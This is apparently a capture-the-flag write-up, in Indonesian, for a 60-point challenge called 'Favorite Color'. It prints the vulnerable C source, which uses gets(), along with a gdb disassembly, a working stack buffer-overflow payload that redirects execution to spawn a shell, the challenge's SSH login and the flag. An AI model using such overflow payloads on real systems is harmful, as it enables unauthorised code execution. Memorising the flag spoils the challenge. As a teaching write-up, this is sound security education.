# Favorite Color (60 Points)
What's your favorite color? Would you like to share with me? Run the command: ssh color@104.131.79.111 -p 1001 (pw: guest) to tell me!
# Solved
Mari kita cek source nya
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int vuln() {
    char buf[32];

    printf("Enter your favorite color: ");
    gets(buf);

    int good = 0;
    for (int i = 0; buf[i]; i++) {
        good &= buf[i] ^ buf[i];
    }

    return good;
}

int main(char argc, char** argv) {
    setresuid(getegid(), getegid(), getegid());
    setresgid(getegid(), getegid(), getegid());

    //disable buffering.
    setbuf(stdout, NULL);

    if (vuln()) {
        puts("Me too! That's my favorite color too!");
        puts("You get a shell! Flag is in flag.txt");
        system("/bin/sh");
    } else {
        puts("Boo... I hate that color! :(");
    }
}
```
Disini kita harus melakukan <b>Bufferoverflow</b> pada fungsi <b>vuln</b>
```
$ "A" * 48 | ./color
Enter your favorite color: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Boo... I hate that color! :(
Segmentation fault (core dumped)
```
Dilihat bahwa offset overflow nya adalah <b>48</b>, untuk mem-bypass fungsi dari good agar menjadi true saya menggunakan gdb untuk mencari address nya
```
Dump of assembler code for function main:
   0x0804864e <+111>:   call   0x804858b <vuln>
   0x08048653 <+116>:   test   %eax,%eax
   0x08048655 <+118>:   je     0x8048689 <main+170>
   0x08048657 <+120>:   sub    $0xc,%esp
   0x0804865a <+123>:   push   $0x804874c
   0x0804865f <+128>:   call   0x8048440 <puts@plt>
   0x08048664 <+133>:   add    $0x10,%esp
   0x08048667 <+136>:   sub    $0xc,%esp
   0x0804866a <+139>:   push   $0x8048774
   0x0804866f <+144>:   call   0x8048440 <puts@plt>
   0x08048674 <+149>:   add    $0x10,%esp
   0x08048677 <+152>:   sub    $0xc,%esp
   0x0804867a <+155>:   push   $0x8048799
   0x0804867f <+160>:   call   0x8048450 <system@plt>
   0x08048684 <+165>:   add    $0x10,%esp
   0x08048687 <+168>:   jmp    0x8048699 <main+186>
   0x08048689 <+170>:   sub    $0xc,%esp
   0x0804868c <+173>:   push   $0x80487a1
   0x08048691 <+178>:   call   0x8048440 <puts@plt>
   0x08048696 <+183>:   add    $0x10,%esp
   0x08048699 <+186>:   mov    $0x0,%eax
   0x0804869e <+191>:   lea    -0xc(%ebp),%esp
   0x080486a1 <+194>:   pop    %ecx
   0x080486a2 <+195>:   pop    %ebx
   0x080486a3 <+196>:   pop    %esi
   0x080486a4 <+197>:   pop    %ebp
   0x080486a5 <+198>:   lea    -0x4(%ecx),%esp
   0x080486a8 <+201>:   ret
```
Lihat pada address <b>0x08048655</b> jika kita berhasil melewati address ini maka kita dapat mengakses flag, tapi bagaimana ? ini exploit yang saya pakai
```
(python -c "print 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1111\x57\x86\x04\x08'"; cat) | ./color
```
```
$ (python -c "print 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1111\x57\x86\x04\x08'"; cat) | ./color
Enter your favorite color: Me too! That's my favorite color too!
You get a shell! Flag is in flag.txt
dir
color  color.c  flag.txt  Makefile
cat flag.txt
flag{c0lor_0f_0verf1ow}
```
Flag : <b>flag{c0lor_0f_0verf1ow}</b>